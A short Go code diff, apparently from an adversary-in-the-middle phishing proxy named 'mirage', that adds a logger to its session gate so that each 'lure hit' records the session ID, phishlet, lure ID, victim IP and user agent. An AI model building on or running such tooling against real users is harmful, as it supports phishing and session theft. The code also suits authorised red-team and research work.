@@ -2,6 +2,7 @@ package request
 
 import (
 	"fmt"
+	"log/slog"
 	"net/http"
 
 	"github.com/travisbale/mirage/internal/aitm"
@@ -22,6 +23,7 @@ type sessionManager interface {
 type SessionGate struct {
 	Sessions sessionManager
 	Spoof    spoofer
+	Logger   *slog.Logger
 }
 
 func (h *SessionGate) Name() string { return "SessionGate" }
@@ -49,13 +51,21 @@ func (h *SessionGate) Handle(ctx *aitm.ProxyContext, req *http.Request) error {
 		return proxy.ErrShortCircuit
 	}
 
-	sess, err := h.Sessions.NewSession(ctx)
+	session, err := h.Sessions.NewSession(ctx)
 	if err != nil {
 		return fmt.Errorf("session_gate: %w", err)
 	}
 
-	ctx.Session = sess
+	ctx.Session = session
 	ctx.IsNewSession = true
+
+	h.Logger.Info("lure hit",
+		"session_id", session.ID,
+		"phishlet", session.Phishlet,
+		"lure_id", session.LureID,
+		"client_ip", ctx.ClientIP,
+		"user_agent", req.UserAgent(),
+	)
 
 	return nil
 }
